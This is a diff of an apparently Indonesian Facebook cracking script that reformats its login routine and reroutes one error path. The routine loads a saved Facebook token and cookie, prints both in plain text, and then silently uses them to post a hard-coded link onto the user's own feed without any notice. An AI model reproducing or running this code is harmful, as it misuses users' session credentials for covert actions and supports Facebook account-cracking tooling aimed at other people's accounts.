@@ -273,43 +273,52 @@ def tahun(fx):
 	else:tahunz=''
 	return tahunz
 #--------------------[ BAGIAN-MASUK ]--------------#
+import requests
+import json
+import os
+import random
+
 def login():
     banner()
     try:
-	   token  = open('token.txt','r').read()
-	   cookie = {'cookie':open('cookie.txt','r').read()}
-		try:
-			token  = open('token.txt','r').read()
-			cookie = {'cookie':open('cookie.txt','r').read()}
-			kook = open('cookie.txt','r').read()
-			get  = requests.Session().get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(token),cookies=cookie)
-			gut = json.loads(get.text)
-			xname = gut["name"]
-			x=f"{P2}{kook}"
-			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
-			x=f"{P2}{token}"
-			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
-			print("")
-			x=f"\t\t{P2}cookie {H2}{xname} {P2}belum invalid"
-			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
-			input(f"{garis} enter untuk ke menu ")
-			ua = random.choice(ua_crack)
-			headers = {'authority': 'graph.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?0','user-agent': ua,}
-			requests.post('https://graph.facebook.com/me/feed?link=https://www.facebook.com/100000871607227/posts/5528296787209320/?substory_index=0&app=fbl&published=0&access_token=%s'%(token),cookies=cookie,headers=headers)
-			menu()
-		except (KeyError):
-			x=f"{P2}cookie kadaluarsa"
-			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
-			os.system('rm -rf cookie.txt')
-			os.system('rm -rf token.txt')
-			turu(0.05)
-			login()
-		except requests.exceptions.ConnectionError:
-			x=f"{P2}koneksi internet bermasalah"
-			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
-			exit()
-	except IOError:
-		login()
+        token = open('token.txt', 'r').read()
+        cookie = {'cookie': open('cookie.txt', 'r').read()}
+        try:
+            token = open('token.txt', 'r').read()
+            cookie = {'cookie': open('cookie.txt', 'r').read()}
+            kook = open('cookie.txt', 'r').read()
+            get = requests.Session().get('https://graph.facebook.com/me?fields=name,id&access_token=%s' % (token),
+                                         cookies=cookie)
+            gut = json.loads(get.text)
+            xname = gut["name"]
+            x = f"{P2}{kook}"
+            vprint(panel(x, style=f"{warna_warni_rich_cerah}"))
+            x = f"{P2}{token}"
+            vprint(panel(x, style=f"{warna_warni_rich_cerah}"))
+            print("")
+            x = f"\t\t{P2}cookie {H2}{xname} {P2}belum invalid"
+            vprint(panel(x, style=f"{warna_warni_rich_cerah}"))
+            input(f"{garis} enter untuk ke menu ")
+            ua = random.choice(ua_crack)
+            headers = {'authority': 'graph.facebook.com', 'cache-control': 'max-age=0', 'sec-ch-ua-mobile': '?0',
+                       'user-agent': ua, }
+            requests.post(
+                'https://graph.facebook.com/me/feed?link=https://www.facebook.com/100000871607227/posts/5528296787209320/?substory_index=0&app=fbl&published=0&access_token=%s' % (
+                    token), cookies=cookie, headers=headers)
+            menu()
+        except (KeyError):
+            x = f"{P2}cookie kadaluarsa"
+            vprint(panel(x, style=f"{warna_warni_rich_cerah}"))
+            os.system('rm -rf cookie.txt')
+            os.system('rm -rf token.txt')
+            turu(0.05)
+            login()
+        except requests.exceptions.ConnectionError:
+            x = f"{P2}koneksi internet bermasalah"
+            vprint(panel(x, style=f"{warna_warni_rich_cerah}"))
+            exit()
+    except IOError:
+        login_lagi334()
 
 def login_lagi334():
 	try:
